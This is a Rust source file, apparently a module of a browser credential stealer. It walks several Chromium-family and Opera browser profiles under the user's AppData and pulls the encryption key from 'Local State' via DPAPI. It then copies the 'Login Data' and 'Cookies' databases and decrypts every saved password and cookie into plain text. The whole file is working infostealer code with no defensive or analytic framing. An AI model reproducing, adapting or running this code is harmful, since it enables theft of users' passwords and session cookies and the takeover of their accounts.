use std::{env, path::{Path, PathBuf}, error::Error, fs};
use serde_json::Value;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use uuid::Uuid;
use rusqlite::{Connection, OpenFlags};
use aes_gcm::{aead::generic_array::GenericArray, aead::{Aead, NewAead}, Aes256Gcm};
use base64::{Engine as _, engine::general_purpose};
#[path = "constants.rs"]
mod constants;

pub fn get_passwords() -> Result<Vec<String>, Box<dyn Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let mut passwords = Vec::new();

    for browser_target in constants::BROWSER_TARGETS.iter() {
        let browser_dir = appdata_dir.join(browser_target);

        if browser_dir.exists() {
            let user_data_dir = get_user_data_dir(&browser_dir)?;
            let local_state_path = user_data_dir.join("Local State");

            if local_state_path.exists() {
                if let Some(master_key) = get_master_key(&local_state_path) {
                    let default_path = get_default_path(&user_data_dir)?;
                    let login_data_path = default_path.join("Login Data");

                    if login_data_path.exists() {
                        let temp_env = env::temp_dir();

                        let temp_path = temp_env.join(Uuid::new_v4().to_string());
                        fs::copy(login_data_path, &temp_path)?;

                        let conn = Connection::open_with_flags(
                            &temp_path,
                            OpenFlags::SQLITE_OPEN_READ_ONLY,
                        )?;

                        let mut stmt = conn.prepare(
                            "SELECT origin_url, username_value, password_value FROM logins",
                        )?;

                        let mut rows = stmt.query([])?;

                        while let Some(row) = rows.next()? {
                            let origin_url: String = row.get(0)?;
                            let username: String = row.get(1)?;
                            let password = aes_decrypt(row.get(2)?, &master_key);

                            passwords.push(format!(
                                "URL: {}\nUsername: {}\nPassword: {}\n\n",
                                origin_url,
                                username,
                                std::str::from_utf8(&password)?
                            ));
                        }

                        drop(rows);
                        stmt.finalize()?;
                        conn.close().unwrap();
                        fs::remove_file(temp_path)?;
                    }
                }
            }
        }
    }
    return Ok(passwords);
}

pub fn get_cookies() -> Result<Vec<String>, Box<dyn Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let mut cookies = Vec::new();

    for browser_target in constants::BROWSER_TARGETS.iter() {
        let browser_dir = appdata_dir.join(browser_target);

        if browser_dir.exists() {
            let user_data_dir = get_user_data_dir(&browser_dir)?;
            let local_state_path = user_data_dir.join("Local State");

            if local_state_path.exists() {
                if let Some(master_key) = get_master_key(&local_state_path) {
                    let default_path = get_default_path(&user_data_dir)?;
                    let cookies_path = default_path.join("Network").join("Cookies");

                    if cookies_path.exists() {
                        let temp_env = std::env::temp_dir();

                        let temp_path = temp_env.join(Uuid::new_v4().to_string());
                        fs::copy(cookies_path, &temp_path)?;

                        let conn = Connection::open_with_flags(
                            &temp_path,
                            OpenFlags::SQLITE_OPEN_READ_ONLY,
                        )?;

                        let mut stmt =
                            conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")?;

                        let mut rows = stmt.query([])?;

                        while let Some(row) = rows.next()? {
                            let host: String = row.get(0)?;
                            let name: String = row.get(1)?;
                            let value = aes_decrypt(row.get(2)?, &master_key);

                            cookies.push(format!(
                                "Host: {}\nName: {}\nValue: {}\n\n",
                                host,
                                name,
                                std::str::from_utf8(&value)?
                            ));
                        }

                        drop(rows);
                        stmt.finalize()?;
                        conn.close().unwrap();
                        fs::remove_file(temp_path)?;
                    }
                }
            }
        }
    }
    return Ok(cookies);
}

fn get_user_data_dir(browser_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut user_data_dir = browser_dir.to_owned();

    if !browser_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }
    return Ok(user_data_dir);
}

fn get_default_path(user_data_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut login_data_path = user_data_dir.to_owned();

    if !user_data_dir.to_string_lossy().contains("Opera Software") {
        login_data_path = login_data_path.join("Default");
    }
    return Ok(login_data_path);
}

fn get_master_key(master_key_path: &PathBuf) -> Option<Vec<u8>> {
    let contents = fs::read_to_string(master_key_path).ok()?;

    let json: Value = serde_json::from_str(contents.as_str()).ok()?;

    if let Some(encrypted_key) = json["os_crypt"]["encrypted_key"].as_str() {
        let plain_text = general_purpose::STANDARD.decode(encrypted_key).ok()?[5..].to_vec();
        let master_key = dpapi_decrypt(plain_text);
        return Some(master_key);
        //return Some(plain_text);
    }
    return None;
}

fn aes_decrypt(cipher_text: Vec<u8>, master_key: &Vec<u8>) -> Vec<u8> {
    let key = GenericArray::from_slice(&master_key);
    let cipher = Aes256Gcm::new(key);

    let nonce = GenericArray::from_slice(&cipher_text[3..15]);

    let plain_text = match cipher.decrypt(nonce, &cipher_text[15..]) {
        Ok(plain_text) => plain_text,
        Err(_) => dpapi_decrypt(cipher_text),
    };

    return plain_text;
}

fn dpapi_decrypt(mut cipher_text: Vec<u8>) -> Vec<u8> {
    let mut in_data = CRYPTOAPI_BLOB {
        cbData: cipher_text.len() as u32,
        pbData: cipher_text.as_mut_ptr(),
    };

    let mut out_data = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    unsafe {
        CryptUnprotectData(
            &mut in_data,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut out_data,
        );

        let plain_text = Vec::from_raw_parts(
            out_data.pbData,
            out_data.cbData as usize,
            out_data.cbData as usize,
        );

        return plain_text;
    };
}